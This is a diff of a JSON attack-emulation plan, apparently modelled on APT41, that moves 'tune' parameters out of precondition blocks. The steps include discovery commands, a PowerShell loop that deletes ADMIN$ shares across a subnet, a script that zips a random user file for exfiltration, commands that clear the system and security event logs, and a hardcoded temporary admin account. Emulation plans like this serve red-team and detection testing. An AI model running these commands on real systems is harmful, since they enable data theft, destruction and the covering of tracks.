@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -65,7 +70,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -76,7 +82,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -86,10 +93,10 @@
                 "actuator_id": "self.actuator",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -99,10 +106,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "getmac"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "getmac"
             }
         },
         {
@@ -112,10 +119,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "netstat -an"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "netstat -an"
             }
         },
         {
@@ -125,10 +132,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "wmic computersystem get username"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "wmic computersystem get username"
             }
         },
         {
@@ -138,10 +145,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net share"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net share"
             }
         },
         {
@@ -151,10 +158,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$network=\"{target_network_slash_24}\"; $range=(1..254); $ErrorActionPreference=\"silentlycontinue\"; Foreach ($add in $range) {net.exe share, ADMIN$, \"\\\\$network.$add\", /delete}; echo \" \" }"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$network=\"{target_network_slash_24}\"; $range=(1..254); $ErrorActionPreference=\"silentlycontinue\"; Foreach ($add in $range) {net.exe share, ADMIN$, \"\\\\$network.$add\", /delete}; echo \" \" }"
             }
         },
         {
@@ -164,10 +171,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "arp -a"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "arp -a"
             }
         },
         {
@@ -177,10 +184,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Compress-Archive -Path $file -DestinationPath \"C:\\file.zip\"; echo $file}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Compress-Archive -Path $file -DestinationPath \"C:\\file.zip\"; echo $file}"
             }
         },
         {
@@ -192,7 +199,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Exfiltration",
@@ -203,7 +211,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Persistence",
@@ -213,7 +222,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -223,7 +233,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "LateralMovement",
@@ -234,7 +245,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1",
                 "target_2": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "LateralMovement",
@@ -245,7 +257,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1",
                 "target_2": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "LateralMovement",
@@ -256,7 +269,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1",
                 "target_2": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -267,7 +281,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1",
                 "target_2": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -277,10 +292,10 @@
                 "actuator_id": "self.actuator",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_2",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -290,10 +305,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "wevtutil clear-log system /r:${self.target_1_hostname}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "wevtutil clear-log system /r:${self.target_1_hostname}"
             }
         },
         {
@@ -303,10 +318,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "wevtutil clear-log security /r:${self.target_1_hostname}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "wevtutil clear-log security /r:${self.target_1_hostname}"
             }
         },
         {
@@ -316,10 +331,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{del C:\\file.zip; echo ' '}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{del C:\\file.zip; echo ' '}"
             }
         },
         {
@@ -329,11 +344,11 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "tmp_local_admin_username": "apt41-user",
-                    "tmp_local_admin_password": "Secure123String"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "tmp_local_admin_username": "apt41-user",
+                "tmp_local_admin_password": "Secure123String"
             }
         },
         {
@@ -343,10 +358,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "tmp_local_admin_username": "apt41-user"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "tmp_local_admin_username": "apt41-user"
             }
         },
         {
@@ -357,7 +372,8 @@
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
                 "target": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -367,7 +383,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
